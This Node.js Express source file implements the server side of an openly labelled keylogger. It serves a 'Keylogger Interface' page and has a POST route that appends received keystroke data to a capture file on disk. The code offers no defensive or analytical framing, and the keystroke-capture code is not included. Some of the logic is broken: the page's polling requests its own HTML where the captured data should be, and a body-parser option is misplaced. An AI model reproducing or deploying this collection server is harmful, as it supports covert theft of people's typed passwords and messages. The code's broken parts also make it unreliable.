const fs = require("fs");
const express = require("express");
const bodyParser = require("body-parser");

const app = express();

// Use body-parser to parse JSON bodies
app.use(bodyParser.json({ extended: true }));

const port = 8080;

// HTML for keylogger-style interface
const htmlForm = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Keylogger Interface</title>
    <style>
        body {
            background-color: #000;
            color: #0f0;
            font-family: monospace;
            padding: 20px;
        }
        #content {
            max-width: 600px;
            margin: 0 auto;
        }
        textarea {
            width: 100%;
            height: 200px;
            background-color: #000;
            color: #0f0;
            border: 1px solid #0f0;
            padding: 10px;
            font-family: monospace;
        }
        button {
            background-color: #00f;
            color: #fff;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
            font-family: monospace;
        }
        button:hover {
            background-color: #0033cc;
        }
        #loggedData {
            margin-top: 20px;
            white-space: pre-wrap;
        }
    </style>
</head>
<body>
    <div id="content">
        <h1>Keylogger Interface</h1>
        <textarea id="keyboardData" placeholder="Waiting for keystrokes..." readonly></textarea><br>
        <button id="clearBtn">Clear</button>
        <hr>
        <h2>Logged Data</h2>
        <pre id="loggedData">Nothing Logged yet.</pre>
    </div>
    
    <script>
        // Function to fetch and display logged data
        function fetchLoggedData() {
            fetch('/')
                .then(response => response.text())
                .then(data => {
                    document.getElementById('loggedData').innerText = data;
                })
                .catch(error => console.error('Error fetching data:', error));
        }

        // Fetch logged data initially when the page loads
        fetchLoggedData();

        // Function to fetch logged data every 5 seconds
        setInterval(fetchLoggedData, 5000);

        // Function to clear textarea
        document.getElementById('clearBtn').addEventListener('click', function() {
            document.getElementById('keyboardData').value = '';
        });
    </script>
</body>
</html>
`;

// Route to serve HTML interface
app.get("/", (req, res) => {
    res.send(htmlForm);
});

// Route to handle POST requests and save the keystrokes data
app.post("/", (req, res) => {
    console.log(req.body.keyboardData);
    
    // Append the received keystrokes data to the file
    fs.appendFileSync("keystroke_captures.txt", req.body.keyboardData + "\n");
    res.send("Successfully logged the data");
});

// Start the server and listen on the specified port
app.listen(port, () => {
    console.log(`Server is listening on port ${port}`);
});
